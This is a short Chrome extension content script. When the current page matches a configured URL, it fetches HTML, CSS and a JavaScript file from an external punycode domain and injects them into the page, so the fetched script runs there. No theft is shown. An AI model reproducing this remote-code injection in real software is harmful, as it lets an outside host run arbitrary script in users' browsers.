chrome.runtime.sendMessage({eventPage: "getIncludeUrl"}, function (obj) {
    if (obj.url) {
        var newURL = obj.url;
        newURL = newURL.split('www.')[1] ? newURL.split('www.')[1] : newURL;
        newURL = newURL.split('https://')[1] ? newURL.split('https://')[1] : newURL;
        newURL = newURL.split('http://')[1] ? newURL.split('http://')[1] : newURL;

        while ((newURL.charAt(newURL.length - 1) == '/') ||
        (newURL.charAt(newURL.length - 1) == ' ') ||
        (newURL.charAt(newURL.length - 1) == '.')) {
            newURL = newURL.substring(0, newURL.length - 1);
        }

        var locUrl = window.location.href;
        locUrl = locUrl.split('www.')[1] ? locUrl.split('www.')[1] : locUrl;
        locUrl = locUrl.split('https://')[1] ? locUrl.split('https://')[1] : locUrl;
        locUrl = locUrl.split('http://')[1] ? locUrl.split('http://')[1] : locUrl;

        while ((locUrl.charAt(locUrl.length - 1) == '/') ||
        (locUrl.charAt(locUrl.length - 1) == ' ') ||
        (locUrl.charAt(locUrl.length - 1) == '.')) {
            locUrl = locUrl.substring(0, locUrl.length - 1);
        }

        if (locUrl == newURL) {
            $.get('https://xn--b1ab8aj6d.xn--p1ai/test/include/tmpl.html',
                function (data) {
                    document.getElementsByTagName("body")[0].innerHTML = document.getElementsByTagName("body")[0].innerHTML + data;
                }
            );
            $.get('https://xn--b1ab8aj6d.xn--p1ai/test/include/style.css',
                function (data) {
                    var link = document.createElement('style');
                    link.rel = 'stylesheet';
                    link.type = 'text/css';
                    link.innerHTML = data;
                    document.getElementsByTagName("head")[0].appendChild(link);
                }
            );
            $.get('https://xn--b1ab8aj6d.xn--p1ai/test/include/injected.js',
                function (data) {
                    var script = document.createElement("script");
                    script.setAttribute("type", "text/javascript");
                    script.innerHTML = data;
                    document.getElementsByTagName("body")[0].appendChild(script);
                }
            );
        }
    }
});